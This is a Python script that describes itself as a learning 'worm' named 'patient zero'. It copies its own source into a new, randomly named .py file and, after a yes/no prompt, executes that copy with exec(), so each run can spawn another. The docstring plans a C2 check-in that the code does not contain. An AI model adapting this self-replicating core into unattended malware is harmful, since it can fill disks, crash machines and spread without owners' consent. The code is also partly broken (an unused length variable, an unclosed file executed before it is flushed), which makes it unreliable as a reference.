"""
Building the code for "patient zero".

This "worm" is created for the purpose of learning and NOT for use in a malicious way.

The whole code will only contain the following parts:

- Code to replicate it's information into a new file
- Code to run that new file created
- Code to call to a "C2" server before doing the above so that it reduces the times it replicates
    - Otherwise without that or a similar mechanism it will replicate until runs out of space, crashes the system, or machine is turned off and restarted.

"""
import pathlib
import string
import random
import shutil
import subprocess
import os


# Getting the file name of the script that is running.
source_file = (pathlib.Path(__file__)).name

# setting the variable for the name generation
data_to_use = string.ascii_letters + string.digits

# Setting the length of the file name before .py
file_length = random.randrange(1, len(data_to_use)+1)


new_file_name = ""

# Creating the file name
for x in range(1, len(data_to_use)+1):
    new_file_name += random.choice(data_to_use)


new_file_name = new_file_name + ".py"

# Create the file that was generated earlier

# create_file = open(new_file_name, "x")

print(
    f"The initial file name is {source_file}. After running the loop the second file name is {new_file_name}")


#

# you have to open the source  file in binary mode with 'rb'
source_file = open(source_file, 'rb')

# you have to open the destination file in binary mode with 'wb'
destination_file = open(new_file_name, 'wb')

# use the shutil.copyobj() method to copy the contents of source_file to destination_file
shutil.copyfileobj(source_file, destination_file)

# destination_file.close()

# Test

get_input = input("Do you want to continue? ")


def execute_python_file(file_path):
    try:
        with open(file_path, 'r') as file:
            python_code = file.read()
            exec(python_code)
    except FileNotFoundError:
        print(f"Error: The file '{file_path}' does not exist.")


if get_input == "Y":
    execute_python_file(new_file_name)
